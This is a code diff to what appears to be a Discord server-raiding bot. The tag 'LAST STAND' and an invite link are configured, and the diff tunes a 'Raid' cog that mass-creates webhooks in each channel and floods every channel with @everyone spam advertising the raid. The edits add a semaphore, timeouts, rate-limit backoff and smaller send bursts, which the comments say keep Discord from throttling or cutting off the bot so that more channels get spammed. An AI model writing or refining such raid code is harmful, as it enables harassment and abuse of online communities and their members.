@@ -27,7 +27,11 @@ RAID_TAG  = "LAST STAND"
 RAID_LINK = "https://discord.gg/s59zWvzK6c"
 RAID_NAME = f"RAIDED BY {RAID_TAG}"
 
-WEBHOOKS_PER = 8
+WEBHOOKS_PER = 3
+
+# Limit concurrent webhook creation across ALL channels so we don't fire
+# 80+ webhook create API calls simultaneously and get the whole bot throttled.
+_WH_CREATE_SEM = asyncio.Semaphore(5)
 
 _MSGS = [
     f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
@@ -316,40 +320,58 @@ class Raid(commands.Cog):
         se = bot_state.stop_event
         webhooks: list[discord.Webhook] = []
 
+        # Stagger webhook creation — only 5 channels create webhooks at a time.
+        # Without this, 20 channels all hammer the webhook create endpoint
+        # simultaneously and the whole bot gets throttled, leaving most channels silent.
         for _ in range(WEBHOOKS_PER):
             if se.is_set():
                 break
             try:
-                wh = await channel.create_webhook(name=random.choice(_WH_NAMES))
+                async with _WH_CREATE_SEM:
+                    wh = await asyncio.wait_for(
+                        channel.create_webhook(name=random.choice(_WH_NAMES)),
+                        timeout=10.0,
+                    )
                 webhooks.append(wh)
+                print(f"[spam] webhook created in #{channel.name} ({len(webhooks)}/{WEBHOOKS_PER})", flush=True)
+            except asyncio.TimeoutError:
+                print(f"[spam] webhook create timeout in #{channel.name}", flush=True)
+                break
             except discord.NotFound:
                 return
             except discord.Forbidden:
-                print(f"[raid] 403 creating webhook in #{channel.name} — missing Manage Webhooks", flush=True)
+                print(f"[spam] 403 webhook in #{channel.name} — missing Manage Webhooks", flush=True)
                 break
             except discord.HTTPException as e:
                 if e.status == 429:
-                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-            except Exception:
+                    wait = float(getattr(e, "retry_after", 2.0))
+                    print(f"[spam] 429 webhook create #{channel.name} — sleeping {wait:.1f}s", flush=True)
+                    await asyncio.sleep(wait)
+            except Exception as e:
+                print(f"[spam] webhook error #{channel.name}: {type(e).__name__}: {e}", flush=True)
                 continue
 
         if not webhooks:
-            # Fallback: direct channel.send
+            # Fallback: direct channel.send — no webhooks available
+            print(f"[spam] no webhooks for #{channel.name} — using channel.send fallback", flush=True)
             while not se.is_set():
                 try:
                     await channel.send(
                         _msg(),
                         allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                     )
+                    await asyncio.sleep(0.5)
                 except (discord.NotFound, discord.Forbidden):
                     return
                 except discord.HTTPException as e:
                     if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                        await asyncio.sleep(float(getattr(e, "retry_after", 2.0)))
                 except Exception:
                     return
             return
 
+        # Spam loop — 5 messages per webhook per iteration (not 15).
+        # 15 caused a burst so large Discord killed the connection entirely.
         while not se.is_set():
             sends = [
                 wh.send(
@@ -358,12 +380,15 @@ class Raid(commands.Cog):
                     allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                 )
                 for wh in webhooks
-                for _ in range(15)
+                for _ in range(5)
             ]
             results = await asyncio.gather(*sends, return_exceptions=True)
             for r in results:
                 if isinstance(r, (discord.NotFound, discord.Forbidden)):
                     return
+                if isinstance(r, discord.HTTPException) and r.status == 429:
+                    await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
+            await asyncio.sleep(0.3)
 
     # ─────────────────────────────────────────────────────────────────────────
     # MEMBER OPS
